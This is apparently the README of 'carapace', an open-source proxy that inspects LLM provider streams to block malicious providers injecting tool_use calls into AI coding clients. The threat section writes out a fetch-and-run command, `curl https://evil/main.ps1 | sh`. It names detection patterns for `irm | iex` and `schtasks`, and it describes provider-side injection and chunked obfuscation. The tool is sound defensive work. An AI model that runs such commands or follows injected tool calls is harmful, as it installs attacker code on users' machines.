# carapace — `cape`

**A local guard against malicious LLM providers — on the wire, not in your client.**

> Work in progress. v0.5-dev already ships the inspecting reverse proxy,
> chunked-bypass-resistant streaming reassembly, real `cape scan` canary probe,
> and the first threat-feed manifest primitives. `audit` and `sentinel` are
> still placeholders until the next milestone.

---

## Why

Cheap API resellers ("grey tokens") are a known malware channel. A malicious
upstream speaks normal Anthropic / OpenAI protocol but **injects `tool_use`
calls into its own response** — and your AI client (Claude Code, Cline, Cursor,
Aider…) happily runs `curl https://evil/main.ps1 | sh`, installs a
scheduler task, routes your traffic through a SOCKS5 proxy, wipes logs.

`cape` sits **between** your client and the upstream so it works with any
client that lets you override the base URL — no per-client plugin, no custom
builds.

```
   AI client                                    real LLM provider
     │                                            ▲
     └──►  carapace (inspect, reassemble, block) ─┘
                │
                └──►  alert + JSONL log
```

## Threat model — what `cape` catches (and what it cannot)

| Threat                                  | v0.1.0 | Note |
| --------------------------------------- | :----: | ---- |
| `tool_use` injected by the provider     | ✅     | Treated as unsolicited unless your request declared the tool. |
| `curl | sh`, `irm | iex`, `schtasks`, … | ✅     | Behavioural RE2 rules over the reassembled stream. |
| Known IoC domains / hosts               | ✅     | Built-in blocklist, overridable at runtime. |
| Chunked obfuscation of `tool_use` input | ✅     | Stream is reassembled before scanning (the core safety property). |
| Passive prompt exfiltration             | ❌     | Structural — do not send secrets to unverified endpoints. Rotate keys after接触 with one. |
| Malware inside a downloaded model file  | ❌     | Use ModelScan for that; carapace is a *wire* guard, not a file scanner. |

## Distinct from `holone`

| Capability | holone | carapace v0.3.0 |
|---|---|---|
| License                   | MIT | **Apache-2.0** (explicit patent grant, trademark clause) |
| Memory-safe key handling | plain env | `zeroize::Secret`, wiped on drop |
| Reassembly before scan   | per-chunk | streaming + per-tool_use buffer until `content_block_stop` |
| Unsolicited tool_use     | ✅ | ✅ + allowed-tool allowlist per request |
| Default mode             | monitor | **block** (alerts alone are useless) |
| Protocol adapters        | hardcoded Anthropic/OpenAI | `ProtocolAdapter` trait (z.ai + DeepSeek planned) |
| E2E chunked-bypass test  | — | ✅ `proxy_blocks_chunked_evil_tool_use_e2e` |

## Install

```sh
# from source
cargo install --path .

# then run
cape proxy --upstream https://api.anthropic.com
```

## Use

```sh
# 1) stand carapace up before your real provider
cape proxy --upstream https://api.anthropic.com --upstream-key "$ANTHROPIC_API_KEY"

# 2) point your client at carapace
export ANTHROPIC_BASE_URL=http://127.0.0.1:8787

# 3) work as usual. carapace logs alerts to stderr and ~/.carapace/carapace.log
```

| Client | How to point |
| --- | --- |
| Claude Code | `export ANTHROPIC_BASE_URL=http://127.0.0.1:8787` or `~/.claude/settings.json` |
| Cline / Roo / Kilo Code | base URL → `http://127.0.0.1:8787` |
| Cursor | Settings → Models → override Anthropic/OpenAI base URL |
| Aider | `--openai-api-base http://127.0.0.1:8787` |

## Roadmap

- **v0.1.0** initial skeleton: CLI, inspector skeleton, builtin rules, zeroize key.
- **v0.2.0** Anthropic + OpenAI real SSE parsing under `ProtocolAdapter` trait.
- **v0.3.0** Streaming forward + per-tool_use reassembly + e2e chunked-bypass test.
- **v0.4.0** Real `parse_declared_tools` so legitimate Claude Code/Cursor tool_use doesn't get false-flagged.
- **v0.5.0** (current) `cape scan` canary probe + threat-feed manifest primitives (rules + blocklist SHA256, signature field reserved for cosign/sigstore).
- **v0.6.0** Signed remote threat feed (summary free, premium detail/telemetry paid) + `cape audit` host IoC scanner.
- **v0.7.0** `cape sentinel` background monitor, encrypted forensics recording, multiple-protocol adapters (z.ai paas/v4, DeepSeek), LLM-judge slow-path, MCP gateway.

## `cape scan`

Probe a provider with a harmless, tool-less prompt before you trust it:

```sh
cape scan --upstream https://api.anthropic.com --key "$ANTHROPIC_API_KEY"
```

What it does:

- chooses a wire dialect (`anthropic` / `openai-like`) based on the endpoint,
  then **sniffs the actual response body** to pick the right parser if the
  provider lies;
- requests **streaming** to exercise the same SSE path real clients use;
- runs the response through the same `ProtocolAdapter` + `Inspector` path as
  the proxy;
- raises `High`/`Critical` if the provider emits unsolicited `tool_use` or
  matches known behavioural rules / IoCs.

What it does **not** prove:

- a clean result does **not** rule out passive prompt theft;
- future behaviour can change after the scan;
- a provider can behave cleanly on canary prompts and dirty on real ones.

## License

Apache-2.0 — see [LICENSE](LICENSE). Briefly: you can fork it, sell it,
modify it; you must keep attribution and the patent grant. The project name
and `cape` binary name are trademarks — not granted by the license.

## Disclaimer

`carapace` is harm reduction, not a guarantee. It reduces but does not eliminate
risk of routing traffic through an untrusted LLM provider. The only safe option
is the official endpoint. If you used an unofficial provider before, **rotate
your API key now** — passive exfiltration cannot be detected on the wire.

## Licensing & trademark (the honest version)

The local proxy you are reading right now is open-source under
**Apache-2.0** — that gives you a clear patent grant, attribution, and the
right to fork. The project name `carapace`, the binary name `cape`, the logo,
and any future "Verified Clean" certification badge are **trademarks held
separately**; they are not granted by the open-source license. If you fork the
proxy and ship it inside your own product, please rename it.

Future cloud features (managed threat feed, multi-machine management, audit
telemetry) will ship as proprietary SaaS — those are explicit paid services
on top of the open core. The local proxy stays open.
